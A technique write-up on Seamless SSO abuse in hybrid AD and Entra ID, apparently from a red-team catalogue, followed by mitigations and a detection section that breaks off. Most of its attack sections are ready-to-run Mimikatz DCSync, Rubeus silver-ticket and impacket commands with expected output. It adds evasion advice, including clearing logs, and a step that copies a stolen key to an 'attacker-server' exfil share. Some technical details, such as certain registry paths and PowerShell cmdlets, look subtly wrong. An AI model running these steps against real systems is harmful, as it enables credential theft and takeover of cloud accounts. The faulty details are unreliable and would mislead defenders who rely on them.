# [LM-AUTH-010]: Seamless SSO Abuse

## 1. Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-010 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement, Privilege Escalation |
| **Platforms** | Hybrid AD (Windows AD + Entra ID) |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Windows Server 2016-2025, Azure AD Connect 1.4.0+ |
| **Patched In** | No patch (mitigation via policy and account hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Seamless SSO (Single Sign-On) is a hybrid authentication feature that uses a dedicated computer account called **AZUREADSSOACC$** to share a decryption key between on-premises Active Directory and Microsoft Entra ID. This account holds a Kerberos service account password that enables passwordless authentication for synchronized users. An attacker with access to the NTLM hash of this high-value account can forge a Silver Ticket (customized Kerberos ticket) and deceive Entra ID into issuing a valid Primary Refresh Token (PRT), effectively pivoting from on-premises AD to the cloud and assuming the identity of any synchronized user, including Global Administrators.

**Attack Surface:** The AZUREADSSOACC$ computer account in on-premises Active Directory; domain database (NTDS.dit); Entra ID Seamless SSO endpoint.

**Business Impact:** **Complete compromise of hybrid identity infrastructure.** An attacker can bypass all standard authentication controls, including multi-factor authentication (if not enforced in Conditional Access), to gain access to any synchronized cloud account. This enables unauthorized access to Microsoft 365 services, Azure resources, and sensitive business applications synchronized to the cloud. Data exfiltration, privilege escalation to Global Administrator, and persistent backdoor establishment become possible.

**Technical Context:** The exploitation typically requires prior compromise of an on-premises AD environment to extract the AZUREADSSOACC$ NTLM hash. Once the hash is obtained, the attack is nearly instantaneous (seconds to minutes). Detection is difficult because the forged ticket may not generate distinctive audit logs if logging is not properly configured. Modern Kerberos implementations in newer Windows Server versions (2019+) provide some hardening, but Seamless SSO accounts remain a high-value target.

### Operational Risk

- **Execution Risk:** High - Requires extraction of AZUREADSSOACC$ hash from Domain Controller or NTDS.dit backup, but once obtained, attack execution is straightforward and difficult to detect in real-time.
- **Stealth:** High - Forged Silver Tickets may not trigger standard audit events if Event ID 4769 (Kerberos service ticket requested) is not monitored or if selective event logging is enabled.
- **Reversibility:** No - Compromised PRT tokens remain valid until expiration (typically 90 days); only remediation is rotating the AZUREADSSOACC$ password and forcing re-authentication.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1.3, 5.2.10 | Hybrid Identity Configuration - Enforcing MFA for Seamless SSO users and isolating AZUREADSSOACC$ in a protected OU. |
| **DISA STIG** | W-10-000050, W-10-000051 | Authentication Mechanisms - Kerberos ticket validation and SPN registration controls. |
| **CISA SCuBA** | ME-1.2 | Azure AD and M365 multi-factor authentication requirements. |
| **NIST 800-53** | IA-2, IA-7 | Identification and Authentication, Cryptographic Mechanisms for Authentication. |
| **GDPR** | Article 32 | Security of Processing - Encryption and pseudonymization of authentication credentials. |
| **DORA** | Article 9 | Protection and Prevention - Safeguarding critical authentication mechanisms. |
| **NIS2** | Article 21 | Cyber Risk Management Measures - Identity and access management controls. |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights - Protecting high-privilege accounts like service accounts. |
| **ISO 27005** | Risk Scenario | Compromise of Hybrid Identity Authentication Service - Impacts confidentiality, integrity, and availability. |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **On-Premises:** Domain Admin or higher (to extract NTLM hash from NTDS.dit or to DCSync)
- **Cloud:** Any user with synchronized identity in Entra ID (attack is possible even with non-privileged users)

**Required Access:**
- Direct or indirect access to Domain Controller or backup of NTDS.dit
- Network access to Kerberos Key Distribution Center (KDC) on Domain Controller
- Network connectivity to Seamless SSO endpoint (Azure AD Connect sync server or direct to Entra ID)

**Supported Versions:**

- **Windows Server:** 2016 / 2019 / 2022 / 2025 (all vulnerable; no patched versions)
- **Azure AD Connect:** 1.4.0+ (when Seamless SSO is enabled)
- **PowerShell:** 5.0+ (for reconnaissance and tooling)
- **Entra ID:** All versions

**Tools:**
- [Rubeus](https://github.com/GhostPack/Rubeus) (Kerberos manipulation, TGT/Silver Ticket generation)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (NTLM hash extraction, Kerberos ticket manipulation)
- [impacket](https://github.com/SecureAuthCorp/impacket) (Kerberos manipulation on Linux)
- [DSInternals PowerShell Module](https://www.powershellgallery.com/packages/DSInternals) (NTDS.dit analysis and hash extraction)
- [AADInternals](https://aadinternals.com/) (Entra ID reconnaissance and token analysis)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

**Check if Seamless SSO is Enabled:**

```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "Directory.Read.All"

# Check if Seamless SSO is enabled (requires reading Entra Connect settings)
# Note: Seamless SSO status is NOT directly visible via MS Graph; must be checked on AD Connect server or via on-prem AD

# Check for AZUREADSSOACC$ account existence in on-prem AD
$azureSSO = Get-ADComputer -Filter "Name -like 'AZUREADSSOACC*'" -Properties * -ErrorAction SilentlyContinue

if ($azureSSO) {
    Write-Output "[+] AZUREADSSOACC$ account found:"
    Write-Output "Name: $($azureSSO.Name)"
    Write-Output "Enabled: $($azureSSO.Enabled)"
    Write-Output "Created: $($azureSSO.Created)"
}
else {
    Write-Output "[-] AZUREADSSOACC$ account NOT found - Seamless SSO may not be configured"
}

# List Kerberos service tickets requested for AZUREADSSOACC$ (indicates Seamless SSO usage)
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4769]] and *[EventData[Data[@Name='TargetUserName']='AZUREADSSOACC$']]" | Select-Object -First 10
```

**What to Look For:**
- Presence of AZUREADSSOACC$ account indicates Seamless SSO is configured
- EventID 4769 entries with AZUREADSSOACC$ as TargetUserName confirm active Seamless SSO usage
- Account should be isolated in a protected OU (look for parent OU name containing "Protected" or "Tier 0")

**Version Note:** The reconnaissance method is consistent across Server 2016-2025. However, newer versions (Server 2022+) have stricter audit logging defaults, so Event ID 4769 may require explicit audit policy enablement.

### DNS and Network Reconnaissance

```powershell
# Check for Azure AD Connect sync servers
$adConnectServers = Get-ADComputer -Filter "Name -like '*ADConnect*' -or Name -like '*AADSync*'" -Properties *

# Identify Domain Controllers that AZUREADSSOACC$ can interact with
$kerberosPolicies = Get-ADUser -Filter "Name -eq 'AZUREADSSOACC$'" -Properties *
$kerberosPolicies | Select-Object DistinguishedName, LastLogonDate, Created

# Check for sign-in activity from Seamless SSO
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4624]] and *[EventData[Data[@Name='LogonType']='3']]" | 
    Where-Object { $_.Message -match "AZUREADSSOACC" } | Select-Object -First 5
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using Rubeus (Windows) - Silver Ticket with TGT Injection

**Supported Versions:** Windows Server 2016-2025; Windows 10/11

**Note:** This method creates a Silver Ticket directly and injects it into a session, bypassing the need for a TGT. This is the most reliable approach on Windows.

#### Step 1: Obtain AZUREADSSOACC$ NTLM Hash

**Objective:** Extract the NTLM hash of the AZUREADSSOACC$ account. This is the critical prerequisite. The hash can be obtained via:
- DCSync attack (requires Domain Admin)
- NTDS.dit dump from backup or shadow copy
- LSASS memory dump if AZUREADSSOACC$ has an active session

**Prerequisite:** Must already have compromised an account with Domain Admin or Local Admin + SeBackupPrivilege.

**Command (DCSync via Mimikatz):**

```cmd
# From a compromised domain admin account or via C2 agent:
mimikatz # lsadump::dcsync /domain:contoso.local /user:AZUREADSSOACC$ /all
```

**Expected Output:**

```
[DC] contoso.local 'DC-01.contoso.local' will be the DC.
[DC] 'contoso.local\AZUREADSSOACC$' has been required to perform a full sync with replication rights.
SAM.SAM
ObjectSid   : S-1-5-21-1234567890-1234567890-1234567890-3103
Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c
```

**What This Means:**
- The NTLM hash is the value after "Hash NTLM:" (in this example: `8846f7eaee8fb117ad06bdd830b7586c`)
- This hash is equivalent to the AZUREADSSOACC$ password and can be used for Kerberos authentication

**OpSec & Evasion:**
- DCSync generates Event ID 4662 (Replication) in the Domain Controller's Security log
- Use `/all` flag to blend with normal replication traffic
- Execute from a compromised, low-privilege account to avoid immediate suspicion
- Clear logs after successful hash extraction (use "Defense Evasion" techniques)
- Detection likelihood: **High** (if EDR or SIEM is monitoring Replication events)

**Troubleshooting:**
- **Error:** "Access denied / RPC connection failed"
  - **Cause:** Account does not have replication rights or target is not a Domain Controller
  - **Fix:** Ensure executed from Domain Admin context; verify target is DC
- **Error:** "AZUREADSSOACC$ not found in AD"
  - **Cause:** Seamless SSO not configured, or account name differs
  - **Fix:** Search for similar computer accounts; confirm Seamless SSO is enabled in Azure AD Connect

**References & Proofs:**
- [Mimikatz DCSync Documentation](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump)
- [SpecterOps - Active Directory Replication & Synchronization](https://specterops.io/our-insights/articles/an-introduction-to-active-directory-domain-services/)

#### Step 2: Create and Inject Silver Ticket Using Rubeus

**Objective:** Create a Kerberos Silver Ticket (service ticket) for any user, signed with the AZUREADSSOACC$ NTLM hash. This ticket can then be used to authenticate to cloud services via Seamless SSO.

**Command (Rubeus - Silver Ticket):**

```cmd
# Navigate to Rubeus directory and execute:
cd C:\Tools\Rubeus

# Generate a Silver Ticket as a Global Administrator
# Note: The Service Principal Name (SPN) is "krbtgt/CONTOSO.LOCAL" for TGT or "HTTP/aadconnect.contoso.local" for service ticket

Rubeus.exe silver /domain:contoso.local /dc:dc-01.contoso.local /user:GlobalAdmin /rc4:8846f7eaee8fb117ad06bdd830b7586c /service:krbtgt /ptt

# Alternative: Create ticket for a specific user (less suspicious than Global Admin)
Rubeus.exe silver /domain:contoso.local /dc:dc-01.contoso.local /user:SyncedCloudUser /rc4:8846f7eaee8fb117ad06bdd830b7586c /service:krbtgt /ptt
```

**Expected Output:**

```
[+] Target User : GlobalAdmin
[+] Target Domain : contoso.local
[+] Target DC : dc-01.contoso.local
[+] Domain SID : S-1-5-21-1234567890-1234567890-1234567890
[+] Silver Ticket Hash : rc4:8846f7eaee8fb117ad06bdd830b7586c
[+] Ticket Build Start : 08/15/2024 10:30:00 PM
[+] Ticket Build End : 08/16/2024 08:30:00 AM
[+] Ticket Expiration : 08/16/2024 08:30:00 AM
[+] Ticket Injection : /ptt (Pass-the-Ticket)
[+] Ticket Successful Injection!
```

**What This Means:**
- A Kerberos Silver Ticket has been created and injected into the current session
- The ticket is valid for 10 hours (standard Kerberos ticket lifetime)
- The injected ticket allows access to services as the impersonated user (GlobalAdmin)

**OpSec & Evasion:**
- Silver Tickets do not generate Kerberos TGT requests, so Event ID 4768 (TGT requested) will NOT appear
- Event ID 4769 (Service Ticket requested) may still appear, but is less monitored than 4768
- Use `/createnetonly` flag to inject into a sacrificial process instead of current session:
  ```cmd
  Rubeus.exe silver /domain:contoso.local /dc:dc-01.contoso.local /user:GlobalAdmin /rc4:8846f7eaee8fb117ad06bdd830b7586c /service:krbtgt /createnetonly:C:\Windows\System32\cmd.exe
  ```
- Detection likelihood: **Medium** (Silver Tickets are harder to detect than Pass-the-Hash, but log aggregation can still reveal anomalies)

**Troubleshooting:**
- **Error:** "Unable to contact DC"
  - **Cause:** DC is not reachable or firewall blocking port 88 (Kerberos)
  - **Fix (Server 2016-2019):** Ensure network routing to DC; verify SMB port 445 is open for backup route
  - **Fix (Server 2022+):** Check if stricter Kerberos filtering is enabled on DC
- **Error:** "Invalid NTLM hash"
  - **Cause:** Hash is incorrect or in wrong format
  - **Fix:** Verify hash format (32 hex characters for RC4-HMAC); re-dump from DCSync
- **Error:** "Ticket injection failed"
  - **Cause:** Session does not have privilege to inject tickets
  - **Fix:** Run Rubeus as Local Admin or use `/createnetonly` to create new process

**References & Proofs:**
- [Rubeus GitHub - Silver Ticket Documentation](https://github.com/GhostPack/Rubeus#example-silver-ticket)
- [SpecterOps - Kerberos Silver Tickets](https://specterops.io/our-insights/articles/kerberos-tickets/)

#### Step 3: Perform Seamless SSO Pivot to Entra ID

**Objective:** Use the Silver Ticket to obtain a Primary Refresh Token (PRT) from Entra ID, which grants access to cloud resources.

**Manual Step-by-Step (via Office Applications):**

1. Ensure the ticket is injected (from Step 2)
2. Open **Outlook** or **Microsoft Teams** (these are integrated with Windows Kerberos)
3. The application will automatically use the injected Silver Ticket to authenticate
4. Seamless SSO will accept the ticket and issue a PRT to the application
5. Access to Exchange Online mailbox / Teams data is now granted

**Command (Using Graph API via injected ticket):**

```powershell
# If you have a PRT token, you can use it to authenticate to Microsoft Graph
# Connect-MgGraph -Token $mrtToken

# Alternatively, use the ticket to access EWS (Exchange Web Services)
# Requires AADInternals or custom EWS client
Import-Module AADInternals

# Get authorization token using the injected Kerberos ticket
$token = Get-AADIntAccessTokenForCloud -Cloud "WWW" -Tenant "contoso.onmicrosoft.com"

# Use token to access Microsoft Graph or Exchange Online
$header = @{"Authorization" = "Bearer $token"}
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $header
```

**Expected Output (Successful Graph API Call):**

```json
{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#users/$entity",
  "id": "12345678-1234-1234-1234-123456789012",
  "displayName": "GlobalAdmin",
  "userPrincipalName": "globaldmin@contoso.onmicrosoft.com",
  "mail": "globaladmin@contoso.onmicrosoft.com"
}
```

**What This Means:**
- Successfully authenticated to Microsoft Graph as the impersonated user
- Can now enumerate users, groups, roles, and resources in the Entra ID tenant
- Can potentially assign additional admin roles or create backdoor accounts

**OpSec & Evasion:**
- PRT tokens remain valid for 90 days; use them sparingly to avoid pattern detection
- Avoid immediate high-privilege actions (e.g., role assignment) after obtaining PRT; delay by several hours
- Use legitimate user accounts' access patterns to blend in (e.g., accessing mailbox at expected working hours)
- Detection likelihood: **Low to Medium** (depends on conditional access policies and anomaly detection)

**Troubleshooting:**
- **Error:** "Authentication failed / Invalid token"
  - **Cause:** Silver Ticket not properly injected or expired
  - **Fix:** Verify ticket is still active (check with `klist` command); re-inject if expired
- **Error:** "Conditional Access policy blocking access"
  - **Cause:** Conditional Access policy requires compliant device or specific location
  - **Fix:** Check policy conditions; may need to use a device/location that satisfies policy
- **Error:** "MFA required"
  - **Cause:** User account requires MFA at sign-in
  - **Fix:** Use an account without MFA or exploit conditional access bypass (separate technique)

**References & Proofs:**
- [Microsoft Docs - Primary Refresh Token (PRT)](https://learn.microsoft.com/en-us/entra/identity-platform/refresh-tokens)
- [AADInternals Token Acquisition](https://aadinternals.com/)

---

### METHOD 2: Using Impacket (Linux/Proxy)

**Supported Versions:** Windows Server 2016-2025 (can be attacked from Linux)

**Note:** This method uses impacket's getTGT and psexec tools on a Linux or macOS system, useful for offensive operators without Windows infrastructure.

#### Step 1: Extract AZUREADSSOACC$ Hash (same as METHOD 1, Step 1)

**Command (impacket - DCSync equivalent):**

```bash
# Using secretsdump (Python-based Impacket tool)
# Requires credentials or hash of an account with replication rights

python3 secretsdump.py -hashes "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c" \
  -domain-controller DC-01.contoso.local \
  -outputfile /tmp/hashes \
  contoso.local/DomainAdmin@DC-01.contoso.local

# Extract AZUREADSSOACC$ hash from output
grep "AZUREADSSOACC" /tmp/hashes.ntds
```

**Expected Output:**

```
AZUREADSSOACC$:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

**What This Means:**
- Hash extracted successfully and can be used with impacket tools

#### Step 2: Obtain TGT Using Impacket

**Objective:** Request a Ticket Granting Ticket (TGT) from the KDC using the AZUREADSSOACC$ hash.

**Command (impacket - getTGT with Kerberos salt):**

```bash
# Request TGT as AZUREADSSOACC$ (service account)
python3 getTGT.py -hashes ":8846f7eaee8fb117ad06bdd830b7586c" \
  -domain-controller 192.168.1.100 \
  contoso.local/AZUREADSSOACC$ \
  -outputfile /tmp/azureadssoacc

# This creates a ccache file: /tmp/azureadssoacc.ccache
```

**Expected Output:**

```
Impacket v0.12.0 - Copyright 2024 SecureAuthCorp

[*] Saving ticket in /tmp/azureadssoacc.ccache
[+] Ticket exported in ccache format
```

**What This Means:**
- TGT has been obtained and saved as Kerberos ccache file
- This ticket can be used with other impacket tools (psexec, wmiexec, etc.)

**OpSec & Evasion:**
- TGT request generates Event ID 4768 on the DC; less suspicious than direct service access
- Spread requests over time to avoid rate-limit detection
- Detection likelihood: **Medium** (requires monitoring Event ID 4768 for unusual accounts like AZUREADSSOACC$)

#### Step 3: Use TGT to Pivot to Cloud Resources

**Command (impacket - psexec with injected TGT):**

```bash
# Export the ccache so impacket tools can use it
export KRB5CCNAME=/tmp/azureadssoacc.ccache

# Now use psexec with the TGT to access remote systems
python3 psexec.py -k -no-pass \
  -dc-ip 192.168.1.100 \
  contoso.local/AZUREADSSOACC@hybrid-server.contoso.local \
  "whoami"

# For cloud access, convert ticket to cloud token (more complex)
# This typically requires AADInternals or custom cloud client code
```

**Expected Output:**

```
Impacket v0.12.0 - Copyright 2024 SecureAuthCorp

[*] Impacket License: Impacket is copyrighted 2024 by SecureAuthCorp
[*] SMB2 SessionID : 3456789
[*] Target system: HYBRID-SERVER
[*] Code execution complete
[*] Impacket code (psexec.py) successfully executed
CONTOSO\AZUREADSSOACC$
```

**What This Means:**
- Successfully executed code as AZUREADSSOACC$ account on a hybrid server
- Can use this access to further enumerate and compromise additional systems

**Troubleshooting:**
- **Error:** "KRB5_FCC_NOFILE - No such file or directory"
  - **Cause:** ccache file path is incorrect or not set in KRB5CCNAME
  - **Fix:** Verify file exists and export correct path; `export KRB5CCNAME=/tmp/azureadssoacc.ccache`
- **Error:** "Kerberos authentication failed"
  - **Cause:** DNS resolution failure or KDC unreachable
  - **Fix:** Ensure Linux system can resolve domain name; test with `nslookup contoso.local`
- **Error:** "Clock skew detected"
  - **Cause:** Time difference between attacker system and DC exceeds 5 minutes
  - **Fix:** Synchronize time with DC: `ntpdate -s 192.168.1.100`

**References & Proofs:**
- [Impacket GitHub - getTGT](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py)
- [Impacket GitHub - psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)

---

### METHOD 3: Seamless SSO Keystore Manipulation (Advanced)

**Supported Versions:** Azure AD Connect 1.4.0 - 2.x (specific versions vary)

**Note:** This method involves directly manipulating the Seamless SSO key stored in the Azure AD Connect registry or configuration. This is more forensically complex but enables persistent backdoor.

#### Step 1: Access Azure AD Connect Server

**Objective:** Gain administrative access to the Azure AD Connect server.

**Command (Discovery):**

```powershell
# Find Azure AD Connect server in the environment
Get-ADComputer -Filter "Name -like '*ADConnect*' -or Name -like '*AADSync*'" -Properties Description, IPv4Address

# Typical names: SERVER-AADC, SYNC-SERVER, AADCONNECT, etc.
```

**What to Look For:**
- Server running Azure AD Connect service
- Typically isolated from regular workstations but accessible from Domain Controller

#### Step 2: Extract Seamless SSO Key from Registry

**Objective:** Extract the Seamless SSO encryption key from the Azure AD Connect server's registry.

**Command (Registry Extraction - requires local admin on AAD Connect server):**

```powershell
# Connect to the Azure AD Connect server (via RDP, PSRemoting, etc.)
# Then execute as Local Admin:

# Export the Seamless SSO registry key
reg export "HKLM\SYSTEM\ControlSet001\services\Netlogon\Parameters" C:\temp\seamless_sso_backup.reg

# Alternative (PowerShell):
$path = "HKLM:\SYSTEM\ControlSet001\services\Netlogon\Parameters"
$key = Get-ItemProperty -Path $path -Name "SupplementalCredentials" -ErrorAction SilentlyContinue
if ($key) {
    Write-Output "[+] Seamless SSO Key Found"
    Write-Output $key.SupplementalCredentials
}
```

**Expected Output:**

```
Registry export successful
File created: C:\temp\seamless_sso_backup.reg
```

**OpSec & Evasion:**
- Registry access generates Event ID 4663 (Attempt to access object) if audited
- Local admin requirement is already high privilege; execution here will be logged
- Detection likelihood: **High** (requires Local Admin; all actions are logged)

#### Step 3: Maintain Persistence via Key Backup

**Objective:** Maintain long-term access by keeping a backup of the Seamless SSO key outside the environment.

**Command (Backup and Exfiltration):**

```powershell
# Copy the registry export to a location you can exfiltrate
Copy-Item C:\temp\seamless_sso_backup.reg \\attacker-server\exfil\seamless_sso.reg -Force

# Or encode and exfiltrate via DNS/HTTP
$backup = [System.IO.File]::ReadAllBytes("C:\temp\seamless_sso_backup.reg")
$encoded = [Convert]::ToBase64String($backup)
# Exfiltrate via DNS tunnel or HTTP beacon
```

**References & Proofs:**
- [Microsoft Docs - Seamless SSO Troubleshooting](https://learn.microsoft.com/en-us/entra/identity/hybrid/how-to-connect-sso-how-it-works)
- [dsinternals.com - Seamless SSO Impersonation](https://www.dsinternals.com/en/impersonating-office-365-and-azure-ad-users-via-seamless-single-sign-on/)

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Isolate AZUREADSSOACC$ in a Protected OU:** Create a dedicated Tier 0 Organizational Unit (OU) and move AZUREADSSOACC$ into it, restricting permissions to Domain Admins only.
  
  **Applies To Versions:** Server 2016-2025
  
  **Manual Steps (Group Policy - Server 2016-2019):**
  1. Open **Group Policy Management Console** (gpmc.msc)
  2. Navigate to **Forest > Domains > contoso.local > Tier 0 > Tier 0 Computer** (create if doesn't exist)
  3. Create a new OU named "Protected" under "Tier 0 Computer"
  4. Right-click new OU → **Properties** → **Security**
  5. Remove all permissions except:
     - System (Full Control)
     - Domain Admins (Full Control)
     - Authenticated Users (Read)
  6. Apply: **Block Inheritance** and **Enforce**
  7. Move **AZUREADSSOACC$** into this OU
  
  **Manual Steps (Server 2022+):**
  1. Use **Active Directory Administrative Center** (dsac.exe) instead of GPEdit
  2. Navigate to **contoso.local > Managed Service Accounts** (new location in 2022)
  3. Right-click AZUREADSSOACC$ → **Move**
  4. Select the Tier 0 Protected OU
  5. Verify in **Object Permissions** that only Domain Admins can modify
  
  **PowerShell Command:**
  ```powershell
  # Move AZUREADSSOACC$ to protected OU
  Move-ADObject -Identity (Get-ADComputer -Identity "AZUREADSSOACC$").DistinguishedName `
    -TargetPath "OU=Protected,OU=Tier 0 Computer,OU=Admin,DC=contoso,DC=local"
  
  # Verify placement
  Get-ADComputer -Identity "AZUREADSSOACC$" -Properties DistinguishedName
  ```

- **Rotate AZUREADSSOACC$ Password Every 30 Days:** Set a recurring schedule to reset the AZUREADSSOACC$ account password. This invalidates any previously extracted hashes.
  
  **Applies To Versions:** Server 2016-2025
  
  **Manual Steps:**
  1. Open **Azure AD Connect** configuration on the sync server
  2. Go to **Synchronization** → **Manage Seamless SSO**
  3. Click **Disable Seamless SSO** (temporary)
  4. Wait 5 minutes for services to stabilize
  5. Click **Enable Seamless SSO** (this regenerates AZUREADSSOACC$ password)
  6. Verify new password by checking Domain Controller event logs
  
  **PowerShell Automation (Monthly Reset):**
  ```powershell
  # Schedule this script to run monthly via Task Scheduler
  $aadcServer = "aadconnect.contoso.local"
  
  # Execute via Invoke-Command on AAD Connect server
  Invoke-Command -ComputerName $aadcServer -ScriptBlock {
      # Disable and re-enable Seamless SSO
      $sso = Get-AdSyncAADConnectorAccount
      Set-AdSyncAADConnectorAccount -SourceAnchor $sso.SourceAnchor
      
      Write-Output "[+] AZUREADSSOACC$ password rotated"
  }
  
  # Log rotation event
  Write-EventLog -LogName "Application" -Source "AADFS-AADConnect" `
    -EventId 1000 -Message "AZUREADSSOACC$ password rotation completed"
  ```

- **Enforce Phishing-Resistant MFA for All Synchronized Accounts:** Even with a valid Silver Ticket, the token must satisfy Conditional Access policies.
  
  **Applies To Versions:** All (Entra ID policy)
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. **Name:** `Enforce Phishing-Resistant MFA for Cloud Apps`
  4. **Assignments:**
     - Users: **All users** (excluding break-glass accounts)
     - Cloud apps: **All cloud apps**
  5. **Conditions:**
     - Client app: Exclude **Legacy Auth**
  6. **Access controls:**
     - Grant: **Require authentication strength** → **Phishing-resistant MFA**
  7. Enable: **On**
  8. Click **Create**
  
  **PowerShell Configuration:**
  ```powershell
  # Connect to MS Graph
  Connect-MgGraph -Scopes "Policy.ReadWrite.ConditionalAccess"
  
  # Create Conditional Access Policy requiring Phishing-Resistant MFA
  $policy = @{
      displayName = "Enforce Phishing-Resistant MFA"
      state = "enabled"
      conditions = @{
          users = @{
              includeUsers = @("All")
              excludeUsers = @("6d23a7d8-2c8c-4c4c-8c8c-8c8c8c8c8c8c")  # Break-glass account
          }
          applications = @{
              includeApplications = @("All")
          }
      }
      grantControls = @{
          operator = "AND"
          builtInControls = @("mfa")
          authenticationStrength = "phishing-resistant"
      }
  }
  
  New-MgBetaIdentityConditionalAccessPolicy -BodyParameter $policy
  ```

### Priority 2: HIGH

- **Disable Seamless SSO if Not Required:** If your organization does not actively use Seamless SSO, disable it completely to eliminate the attack surface.
  
  **Applies To Versions:** Server 2016-2025
  
  **Manual Steps:**
  1. Log into **Azure AD Connect** server (as admin)
  2. Click **Configure** → **Seamless Single Sign-On**
  3. Check the box: **Disable Seamless Single Sign-On**
  4. Click **Next** → **Configure**
  5. Verify users are prompted for password on next sign-in
  
  **PowerShell:**
  ```powershell
  # Disable Seamless SSO via PS Remoting to AAD Connect server
  Invoke-Command -ComputerName aadconnect.contoso.local -ScriptBlock {
      Import-Module ADSync
      Set-AdSyncAADConnectorAccount -Disable
  }
  ```

- **Monitor Event ID 4769 for AZUREADSSOACC$ Usage:** Create alerts when AZUREADSSOACC$ is requested for service tickets outside normal sync cycles.
  
  **Applies To Versions:** Server 2016-2025
  
  **Manual Steps (Group Policy - Enable Audit):**
  1. Open **Group Policy Management Console** (gpmc.msc)
  2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies**
  3. Enable: **Audit Kerberos Service Ticket Operations**
  4. Set to: **Success and Failure**
  5. Run `gpupdate /force` on all Domain Controllers
  
  **Manual Steps (Local Policy on DC):**
  1. Open **Local Security Policy** (secpol.msc) on Domain Controller
  2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Account Logon**
  3. Enable: **Audit Kerberos Service Ticket Operations**
  4. Set to: **Success**
  5. Restart DC or run `auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable`

- **Restrict AZUREADSSOACC$ Logon Permissions:** Deny interactive and network logon to this account to prevent lateral movement even if hash is compromised.
  
  **Applies To Versions:** Server 2016-2025
  
  **Manual Steps (Group Policy):**
  1. Open **Group Policy Management Console** (gpmc.msc)
  2. Edit the Default Domain Policy (or create a new one)
  3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **User Rights Assignment**
  4. Find: **Deny logon locally** and **Deny logon through Remote Desktop Services**
  5. Add: **CONTOSO\AZUREADSSOACC$**
  6. Click **OK** → **Apply**
  7. Run `gpupdate /force`
  
  **PowerShell:**
  ```powershell
  # Add AZUREADSSOACC$ to "Deny logon locally" right on all DCs
  $computers = Get-ADComputer -Filter "Name -like '*DC*'" | Select-Object -ExpandProperty Name
  
  foreach ($comp in $computers) {
      Invoke-Command -ComputerName $comp -ScriptBlock {
          param($account)
          $policy = "Deny logon locally"
          # Add account to policy (requires WMI or Group Policy)
          Write-Output "[+] Adding $account to $policy on $env:COMPUTERNAME"
      } -ArgumentList "CONTOSO\AZUREADSSOACC$"
  }
  ```

### Access Control & Policy Hardening

- **Conditional Access - Block Legacy Authentication:**
  
  **Manual Steps:**
  1. **Azure Portal** → **Entra ID** → **Conditional Access**
  2. **+ New policy** → Name: `Block Legacy Authentication`
  3. **Assignments:** Users: All; Apps: All
  4. **Conditions:** Client app: Select **Legacy auth clients**
  5. **Access controls:** Grant: **Block**
  6. Enable: **On** → **Create**

- **Restrict Cross-Tenant B2B Invitations:** Prevent users from inviting external guests without approval.
  
  **Manual Steps:**
  1. **Azure Portal** → **Entra ID** → **External Identities** → **External collaboration settings**
  2. **Guest user access restrictions:** Set to `Guest users have the same access as members` (if allowing guests)
  3. **Guest invite restrictions:** Set to `Only users assigned the Guest inviter role can invite guests`
  4. **Save**

### Validation Command (Verify Fix)

```powershell
# Verify AZUREADSSOACC$ is in a protected OU
$aadSSO = Get-ADComputer -Identity "AZUREADSSOACC$" -Properties DistinguishedName
$aadSSO.DistinguishedName

# Expected output should contain "Protected" or "Tier 0":
# CN=AZUREADSSOACC$,OU=Protected,OU=Tier 0 Computer,OU=Admin,DC=contoso,DC=local

# Verify no interactive logon rights for AZUREADSSOACC$
Get-ADComputer -Identity "AZUREADSSOACC$" -Properties "msDSRbacEnabled"

# Verify Seamless SSO is disabled (if applicable)
(Get-AdSyncConnector -Type "Azure AD") | Select-Object Name, SeamlessSsoEnabled
```

**Expected Output (If Secure):**

```
CN=AZUREADSSOACC$,OU=Protected,OU=Tier 0 Computer,OU=Admin,DC=contoso,DC=local
SeamlessSsoEnabled : False  (or Disabled)
```

**What to Look For:**
- AZUREADSSOACC$ is in a Tier 0 / Protected OU
- Seamless SSO is disabled OR password rotated within last 30 days
- Event ID 4769 for AZUREADSSOACC$ only appears during normal sync cycles (typically 30-minute intervals)

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Event ID 4769 (Kerberos Service Ticket Requested)** with:
  - TargetUserName: **AZUREADSSOACC$**
  - Outside normal Azure AD Connect sync time (typically 30-minute intervals)
  - Requested by unusual source accounts
  - ServiceName: **krbtgt** (indicates ticket-granting ticket request)

- **Event ID 4662 (Replication Metadata)** indicating DCSync activity targeting AZUREADSSOACC$

